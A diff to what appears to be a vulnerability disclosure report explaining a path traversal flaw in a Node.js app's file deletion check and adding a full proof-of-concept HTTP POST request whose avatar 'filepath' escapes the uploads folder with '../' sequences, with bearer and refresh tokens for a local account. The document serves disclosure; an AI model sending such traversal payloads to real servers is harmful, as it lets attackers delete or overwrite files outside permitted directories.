@@ -278,4 +278,41 @@ const deleteLocalFile = async (req, file) => {
 };
 ```        
      
-The vulnerability is occurred by the ```if(file.filepath.startsWith(`/uploads/${req.user.id}`))``` condition. If the user enters a `file.filepath` to `/uploads/xxxx/../../../../../../../app/test/hacked`, the value of variable named `filepath` is `/app/test/hacked`. Thus, we can get a path traversal vulnerability in this project. Done.       
+The vulnerability is occurred by the ```if(file.filepath.startsWith(`/uploads/${req.user.id}`))``` condition. If the user enters a `file.filepath` to `/uploads/xxxx/../../../../../../../app/test/hacked`, the value of variable named `filepath` is `/app/test/hacked`. Thus, we can write a payload as follows.    
+     
+```http
+POST /api/agents/avatar/asdf HTTP/1.1
+Host: localhost:3080
+Content-Length: 10352
+sec-ch-ua-platform: "Windows"
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MGZhNWE1YTcyY2QwNjZmMzQxYjcwZCIsInVzZXJuYW1lIjoiYWFhYWEiLCJwcm92aWRlciI6ImxvY2FsIiwiZW1haWwiOiJhYWFhYUBuYXZlci5jb20iLCJpYXQiOjE3MjkxMzgzNzcsImV4cCI6MTcyOTEzOTI3N30.Drs4845G6BvwlTsbPmIU97COOEpUYnb1QPNDxczl77c
+Accept-Language: ko-KR,ko;q=0.9
+sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqD8OKhALyMzAPlIU
+Origin: http://localhost:3080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost:3080/c/new
+Accept-Encoding: gzip, deflate, br
+Cookie: refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MGZhNWE1YTcyY2QwNjZmMzQxYjcwZCIsImlhdCI6MTcyOTEzODM3NywiZXhwIjoxNzI5Njk4NjI0fQ.QnMNZfYNdC-kKdfjxeOWihbiF053uWNiPPsnWJU75m0
+Connection: keep-alive
+
+------WebKitFormBoundaryqD8OKhALyMzAPlIU
+Content-Disposition: form-data; name="file"; filename="avatar.png"
+Content-Type: image/png
+
+PNG Binary
+------WebKitFormBoundaryqD8OKhALyMzAPlIU
+Content-Disposition: form-data; name="avatar"
+
+{
+    "source":"local",
+    "filepath":"/uploads/670fa5a5a72cd066f341b70d/../../../../../../../../app/test/hacked"
+}
+------WebKitFormBoundaryqD8OKhALyMzAPlIU--
+```        
+  
